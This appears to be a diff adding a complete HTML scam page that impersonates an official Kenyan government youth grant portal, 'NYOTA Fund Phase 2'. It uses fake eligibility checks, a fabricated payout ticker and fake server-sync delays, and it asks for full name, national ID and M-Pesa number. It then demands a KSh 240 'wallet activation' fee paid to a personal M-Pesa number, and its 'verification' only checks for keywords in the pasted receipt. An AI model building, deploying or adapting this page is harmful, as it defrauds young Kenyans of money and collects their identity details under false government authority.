@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NYOTA Fund Phase 2 | Official Presidential Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --kenya-green: #06402b; --gold: #ffcc00; --deep-dark: #070b14; --glass: rgba(255, 255, 255, 0.05);
+            --success: #4ade80; --error: #ff4d4d;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background-color: var(--deep-dark); color: #e2e8f0; overflow-x: hidden; }
+
+        /* Landing Page Background - Kenyan Flag */
+        #home {
+            background: linear-gradient(rgba(7, 11, 20, 0.8), rgba(7, 11, 20, 0.8)), 
+                        url('https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Kenya.svg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        #loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(7, 11, 20, 0.95); backdrop-filter: blur(10px);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999;
+        }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 4px solid rgba(255, 204, 0, 0.1);
+            border-left-color: var(--gold);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .loader-text { margin-top: 20px; font-weight: 600; color: var(--gold); letter-spacing: 1px; font-size: 0.9rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        nav { display: flex; flex-direction: column; align-items: center; background: rgba(7, 11, 20, 0.98); backdrop-filter: blur(15px); position: fixed; width: 100%; z-index: 1000; border-bottom: 1px solid var(--glass); }
+        .nav-top { width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 0.8rem 6%; }
+        .logo { font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; }
+        .logo span { color: var(--gold); }
+        .kenya-flag-icon { width: 28px; height: auto; border-radius: 2px; }
+
+        .ticker-bar { width: 100%; background: #000; padding: 8px 0; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: center; align-items: center; height: 40px; }
+        .ticker-item { font-size: 0.85rem; font-weight: 600; color: #fff; animation: slideIn 0.5s ease-out; text-align: center; }
+        .ticker-item span { color: var(--gold); }
+        @keyframes slideIn { from { transform: translateY(15px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .menu-btn { cursor: pointer; z-index: 1001; }
+        .menu-btn div { width: 22px; height: 2px; background: white; margin: 5px; }
+        .nav-links { position: fixed; right: -100%; top: 0; height: 100vh; width: 280px; background: #000; display: flex; flex-direction: column; padding: 120px 30px; gap: 20px; transition: 0.4s; z-index: 999; }
+        .nav-links.open { right: 0; }
+        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 1rem; cursor: pointer; border-bottom: 1px solid var(--glass); padding-bottom: 10px; }
+
+        .page { display: none; padding: 160px 6% 60px; min-height: 100vh; animation: fadeIn 0.4s ease-in-out; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .glass-card { background: var(--glass); border: 1px solid rgba(255,255,255,0.08); padding: 2.2rem; border-radius: 20px; max-width: 600px; margin: 0 auto; backdrop-filter: blur(10px); }
+        .btn-prime { background: var(--gold); color: #000; padding: 15px; border-radius: 10px; font-weight: 800; border: none; cursor: pointer; width: 100%; margin-top: 10px; font-size: 1rem; transition: 0.3s; }
+        .btn-prime:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; opacity: 0.6; }
+        
+        input, textarea { width: 100%; padding: 14px; background: rgba(15, 23, 42, 0.8); border: 1px solid #334155; border-radius: 10px; color: white; margin-bottom: 1.2rem; outline: none; }
+
+        /* County Grid Styles */
+        .county-container { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); 
+            gap: 10px; 
+            max-height: 400px; 
+            overflow-y: auto; 
+            padding: 15px; 
+            background: rgba(0,0,0,0.2); 
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px solid var(--glass);
+        }
+        .county-item { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            font-size: 0.85rem; 
+            padding: 8px; 
+            background: var(--glass); 
+            border-radius: 6px; 
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .county-item:hover { background: rgba(255,255,255,0.1); }
+        .county-item input { width: auto; margin: 0; cursor: pointer; }
+
+        .selection-msg { 
+            display: none; 
+            background: rgba(74, 222, 128, 0.15); 
+            color: var(--success); 
+            padding: 12px; 
+            border-radius: 10px; 
+            font-size: 0.85rem; 
+            text-align: center; 
+            margin-bottom: 15px;
+            font-weight: 600;
+            border: 1px solid var(--success);
+        }
+
+        .payment-box { background: #fff; color: #000; padding: 25px; border-radius: 15px; margin: 20px 0; text-align: center; border: 2px dashed #39b54a; }
+        .copy-icon { cursor: pointer; background: var(--gold); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; font-weight: bold; margin-left: 8px; }
+        .form-error { color: var(--error); font-size: 0.8rem; display: none; margin-bottom: 10px; text-align: center; }
+        .dash-row { display: flex; justify-content: space-between; padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .dash-label { color: #94a3b8; font-size: 0.9rem; }
+        .dash-value { font-weight: 600; color: #fff; }
+
+        footer { text-align: center; padding: 40px; color: #475569; font-size: 0.75rem; border-top: 1px solid var(--glass); background: #000; }
+    </style>
+</head>
+<body>
+
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+        <div class="loader-text">SYNCING WITH GOVERNMENT SERVERS...</div>
+    </div>
+
+    <nav>
+        <div class="nav-top">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Kenya.svg" alt="Kenya Flag" class="kenya-flag-icon">
+                NYOTA<span>FUND 2.0</span>
+            </div>
+            <div class="menu-btn" onclick="toggleMenu()">
+                <div></div><div></div><div></div>
+            </div>
+        </div>
+        <div class="ticker-bar">
+            <div class="ticker-item" id="tickerDisplay">Loading live payouts...</div>
+        </div>
+        <div class="nav-links" id="navLinks">
+            <a onclick="showPage('home'); toggleMenu()">Home</a>
+            <a onclick="showPage('county-select'); toggleMenu()">Apply Now</a>
+            <a onclick="showPage('track'); toggleMenu()">Dashboard</a>
+        </div>
+    </nav>
+
+    <section id="home" class="page active">
+        <div style="text-align: center; max-width: 800px; margin: 0 auto; background: rgba(0,0,0,0.4); padding: 40px; border-radius: 30px; backdrop-filter: blur(5px);">
+            <h1 style="font-size: 3rem; margin-bottom: 1.5rem; text-shadow: 2px 2px 10px rgba(0,0,0,0.8);">Empowering <span>Kenyan Youth</span> Through Capital</h1>
+            <p style="color: #cbd5e1; font-size: 1.1rem; font-weight: 500;">Access KSh 22,000 direct business grants. No interest. No collateral. Your future starts here.</p>
+            <br>
+            <button class="btn-prime" onclick="showPage('county-select')" style="width: auto; padding: 18px 50px; box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);">Apply for KSh 22,000</button>
+        </div>
+    </section>
+
+    <section id="county-select" class="page">
+        <div class="glass-card" style="max-width: 800px;">
+            <h2 style="text-align: center;">Select Your Residency</h2>
+            <p style="text-align: center; color: #94a3b8; margin-top: 10px;">Checking eligibility for Phase 2 disbursement based on your region.</p>
+            
+            <div class="county-container" id="countyGrid"></div>
+
+            <div id="selectionSuccess" class="selection-msg">
+                ✅ Eligibility Verified! Funding is currently available in <span id="msgCounty"></span>.
+            </div>
+
+            <button id="countyNextBtn" class="btn-prime" onclick="showPage('apply')" disabled>Proceed to Application</button>
+        </div>
+    </section>
+
+    <section id="apply" class="page">
+        <div class="glass-card">
+            <h2>Enrollment Form</h2>
+            <p style="margin-bottom: 20px; color: #94a3b8; font-size: 0.9rem;">Verified via Integrated Population Registration System (IPRS).</p>
+            <form id="regForm">
+                <div id="applyError" class="form-error">❌ All fields are required to proceed.</div>
+                <label style="font-size: 0.85rem; color: #94a3b8;">Full Name</label>
+                <input type="text" id="regName" placeholder="Full Official Names" required>
+                <label style="font-size: 0.85rem; color: #94a3b8;">National ID / Birth Certificate</label>
+                <input type="number" id="regId" placeholder="ID Number" required>
+                <label style="font-size: 0.85rem; color: #94a3b8;">M-Pesa Number</label>
+                <input type="tel" id="regPhone" placeholder="07xxxxxxxx" required>
+                <button type="button" class="btn-prime" onclick="processRegistration()">Submit Application</button>
+            </form>
+        </div>
+    </section>
+
+    <section id="approval" class="page">
+        <div class="glass-card" style="border-color: var(--success);">
+            <div style="text-align: center; margin-bottom: 1.5rem;">
+                <span style="background: rgba(74, 222, 128, 0.2); color: var(--success); padding: 5px 15px; border-radius: 50px; font-weight: 800; font-size: 0.8rem;">APPROVAL GRANTED</span>
+            </div>
+            <h3>Congratulations, <span id="userGreet" style="color: var(--gold);">Applicant</span>!</h3>
+            <p style="margin: 1rem 0; font-size: 0.95rem; color: #94a3b8;">Your KSh 25,000 total allocation has been reserved in the system.</p>
+            <div class="dash-row"><span class="dash-label">M-Pesa Disbursement</span><span class="dash-value">KSh 22,000</span></div>
+            <div class="dash-row"><span class="dash-label">NSSF Haba Haba Savings</span><span class="dash-value">KSh 3,000</span></div>
+            <div class="dash-row" style="border: none;"><span class="dash-label">Total Grant Value</span><span class="dash-value" style="color: var(--gold);">KSh 25,000</span></div>
+            <p style="margin-top: 1.5rem; font-size: 0.9rem; line-height: 1.5;">To receive your <b>KSh 22,000</b> disbursement, you must activate your government-backed savings wallet with a one-time fee of KSh 240.</p>
+            <button class="btn-prime" onclick="showPage('savings')">Proceed to Activation</button>
+        </div>
+    </section>
+
+    <section id="savings" class="page">
+        <div class="glass-card">
+            <h2>Wallet Activation</h2>
+            <div class="payment-box">
+                <p style="color: #39b54a; font-weight: 900; font-size: 1.4rem;">M-PESA</p>
+                <div style="font-weight: 800; font-size: 1.5rem; margin: 10px 0;">0105565417 <span class="copy-icon" id="copyBtn" onclick="copyNumber()">COPY</span></div>
+                <p>Recipient: <b>Judith</b></p>
+                <p style="font-size: 1.5rem; font-weight: 800; color: #39b54a; margin-top: 10px;">KSh 240.00</p>
+            </div>
+            <label style="font-size: 0.85rem; color: #94a3b8;">Paste M-Pesa Confirmation Message:</label>
+            <textarea id="mpesaMsg" rows="4" placeholder="Paste the message from Judith here..."></textarea>
+            <button class="btn-prime" onclick="verifyJudith()">Verify Payment & Disburse</button>
+        </div>
+    </section>
+
+    <section id="track" class="page">
+        <div class="glass-card">
+            <h2 style="margin-bottom: 1.5rem;">Beneficiary Portal</h2>
+            <div style="background: rgba(255, 204, 0, 0.1); padding: 20px; border-radius: 15px; margin-bottom: 2rem; border: 1px solid var(--gold); text-align: center;">
+                <p style="font-size: 0.85rem; color: var(--gold); font-weight: bold;">DISBURSEMENT STATUS</p>
+                <h3 style="font-size: 2.2rem; margin: 5px 0;">KSh 22,000</h3>
+                <span style="color: var(--success); font-weight: 800;">● PROCESSING TRANSFER</span>
+            </div>
+            <div class="dash-row"><span class="dash-label">Beneficiary Name</span><span id="dashName" class="dash-value">-</span></div>
+            <div class="dash-row"><span class="dash-label">ID Number</span><span id="dashId" class="dash-value">-</span></div>
+            <div class="dash-row"><span class="dash-label">County</span><span id="dashCounty" class="dash-value">-</span></div>
+            <p style="margin-top: 2rem; font-size: 0.8rem; color: #64748b; text-align: center;">Note: Funds will reflect in your M-Pesa account shortly after final server sync.</p>
+        </div>
+    </section>
+
+    <footer>
+        © 2026 Republic of Kenya | Nyota Fund Phase 2 | Presidential Youth Empowerment
+    </footer>
+
+    <script>
+        const counties = [
+            "Mombasa", "Kwale", "Kilifi", "Tana River", "Lamu", "Taita–Taveta", "Garissa", "Wajir", "Mandera", "Marsabit", 
+            "Isiolo", "Meru", "Tharaka-Nithi", "Embu", "Kitui", "Machakos", "Makueni", "Nyandarua", "Nyeri", "Kirinyaga", 
+            "Murang'a", "Kiambu", "Turkana", "West Pokot", "Samburu", "Trans-Nzoia", "Uasin Gishu", "Elgeyo-Marakwet", "Nandi", "Baringo", 
+            "Laikipia", "Nakuru", "Narok", "Kajiado", "Kericho", "Bomet", "Kakamega", "Vihiga", "Bungoma", "Busia", 
+            "Siaya", "Kisumu", "Homa Bay", "Migori", "Kisii", "Nyamira", "Nairobi"
+        ];
+
+        const youths = ["Mwangi Karanja", "Achieng Otieno", "Fatuma Hassan", "Kibet Kiprop", "Mutua Musyoka", "Nanjala Wafula", "Wanjiku Kamau", "Moraa Nyaboke", "Ochieng Juma", "Cheruiyot Bett", "Waweru Maina", "Atieno Anyango", "Kadhini Mwalimu", "Ghati Robi", "Saitoti Ole Kaparo"];
+
+        let selectedCounty = "";
+
+        const grid = document.getElementById('countyGrid');
+        counties.forEach((c, idx) => {
+            const div = document.createElement('label');
+            div.className = 'county-item';
+            div.innerHTML = `<input type="radio" name="county" value="${c}" onchange="checkCounty()"> ${idx + 1}. ${c}`;
+            grid.appendChild(div);
+        });
+
+        function checkCounty() {
+            const radios = document.getElementsByName('county');
+            for(let r of radios) {
+                if(r.checked) {
+                    selectedCounty = r.value;
+                    document.getElementById('msgCounty').innerText = selectedCounty + " County";
+                    document.getElementById('selectionSuccess').style.display = "block";
+                    document.getElementById('countyNextBtn').disabled = false;
+                    break;
+                }
+            }
+        }
+
+        function rotateTicker() {
+            const display = document.getElementById('tickerDisplay');
+            const randomYouth = youths[Math.floor(Math.random() * youths.length)];
+            const randomPhone = "07" + Math.floor(10 + Math.random() * 89) + "xxx" + Math.floor(100 + Math.random() * 899);
+            display.innerHTML = `${randomYouth} (<span>${randomPhone}</span>) just received <span>KSh 22,000</span> Grant.`;
+        }
+        setInterval(rotateTicker, 3000);
+        rotateTicker();
+
+        function toggleMenu() { document.getElementById('navLinks').classList.toggle('open'); }
+
+        function showPage(pageId) {
+            const loader = document.getElementById('loader-overlay');
+            loader.style.display = 'flex';
+            setTimeout(() => {
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                document.getElementById(pageId).classList.add('active');
+                loader.style.display = 'none';
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }, 3000); 
+        }
+
+        function processRegistration() {
+            const name = document.getElementById('regName').value;
+            const id = document.getElementById('regId').value;
+            const phone = document.getElementById('regPhone').value;
+            const errorDiv = document.getElementById('applyError');
+
+            if(name && id && phone) {
+                errorDiv.style.display = "none";
+                document.getElementById('userGreet').innerText = name.split(' ')[0];
+                document.getElementById('dashName').innerText = name;
+                document.getElementById('dashId').innerText = id;
+                document.getElementById('dashCounty').innerText = selectedCounty;
+                showPage('approval');
+            } else {
+                errorDiv.style.display = "block";
+            }
+        }
+
+        function copyNumber() {
+            navigator.clipboard.writeText("0105565417");
+            const btn = document.getElementById('copyBtn');
+            btn.innerText = "COPIED!";
+            setTimeout(() => { btn.innerText = "COPY"; }, 2000);
+        }
+
+        function verifyJudith() {
+            const msg = document.getElementById('mpesaMsg').value.toLowerCase();
+            if (msg.includes("240") && msg.includes("0105565417") && msg.includes("judith")) {
+                showPage('track');
+            }
+        }
+    </script>
+</body>
+</html>
